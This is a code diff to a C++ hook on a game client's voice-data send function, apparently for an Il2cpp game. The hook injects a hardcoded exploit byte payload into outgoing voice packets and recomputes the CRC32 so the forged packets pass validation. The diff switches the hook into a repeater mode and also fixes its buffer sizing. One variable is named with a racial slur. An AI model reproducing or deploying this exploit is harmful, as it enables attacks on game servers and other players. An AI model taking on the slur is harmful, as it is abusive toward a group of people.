@@ -12,6 +12,7 @@ std::uniform_int_distribution<rng_type::result_type> repeaterRng(5, 10);
 rng_type rng;
 
 const char exploitData[] = "\x68\xF5\x94\x05\x01\x00\x10\x01\x0B\xC0\x5D\xCA\xC8\xD3\xCC\xC9\xD4\xD6\x4B\x45\x4D\x4F\x4E\x4F\xf3\x0e\x2f\x3e";
+constexpr unsigned int lowerBound = 18;
 
 
 void hk__BP_SendVoiceData(BasePlayer* instance, System::Array<System::Byte*>* data, int len)
@@ -22,10 +23,10 @@ void hk__BP_SendVoiceData(BasePlayer* instance, System::Array<System::Byte*>* da
 	rng_type::result_type const seedval = seed;; // get this from somewhere
 	rng.seed(seedval);
 
-	constexpr bool repeater = false;
+	constexpr bool repeater = true;
 	constexpr bool exploit = true;
-	constexpr bool exploitOnly = true;
-	constexpr bool doubler = true;
+	constexpr bool exploitOnly = false;
+	constexpr bool doubler = false;
 	constexpr bool randomizer = false;
 
 	static int nigger = 0;
@@ -37,7 +38,7 @@ void hk__BP_SendVoiceData(BasePlayer* instance, System::Array<System::Byte*>* da
 	uint32_t crc = crc32_fast(data->data(), data->length() - 4);
 	bool crcCheck = (crc == *(uint32_t*)((uintptr_t)data->data() + data->length() - 4));
 
-	System::Array<System::Byte*>* exploitOnlyBuffer = (System::Array<System::Byte*>*)Il2cppLib::new_array("System::Byte", 0x1B);
+	System::Array<System::Byte*>* exploitOnlyBuffer = (System::Array<System::Byte*>*)Il2cppLib::new_array("System::Byte", lowerBound + sizeof(exploitData)-1 + 4);
 	auto sendBuffer = exploitOnly ? exploitOnlyBuffer : data;
 	
 	std::cout 
@@ -72,7 +73,10 @@ void hk__BP_SendVoiceData(BasePlayer* instance, System::Array<System::Byte*>* da
 				hue::red(std::cout);
 		}
 
-		constexpr unsigned int lowerBound = 18;
+
+		if (exploitOnly) {
+			((uint8_t*)sendBuffer->data())[i] = ((uint8_t*)data->data())[i];
+		}
 
 		if (i >= lowerBound) {
 
@@ -81,14 +85,20 @@ void hk__BP_SendVoiceData(BasePlayer* instance, System::Array<System::Byte*>* da
 				hue::light_yellow(std::cout);
 			}
 
-			if (exploit && i - lowerBound < sizeof(exploitData)) {
+			if (exploit && i - lowerBound < sizeof(exploitData)-1) {
 				((uint8_t*)sendBuffer->data())[i] = exploitData[i - lowerBound];
 				hue::light_red(std::cout);
 			}
-			else if (exploitOnly) {
-				((uint8_t*)sendBuffer->data())[i] = ((uint8_t*)data->data())[i];
-			}
+			
 		}
+
+
+		if (i >= sendBuffer->length() - 4) {
+
+			*(uint32_t*)((uintptr_t)sendBuffer->data() + sendBuffer->length() - 4)
+				= crc32_fast(sendBuffer->data(), sendBuffer->length() - 4);
+		}
+
 
 		//std::cout << std::hex << (uintptr_t)((uint8_t*)sendBuffer->data())[i] << " ";
 		hue::reset(std::cout);
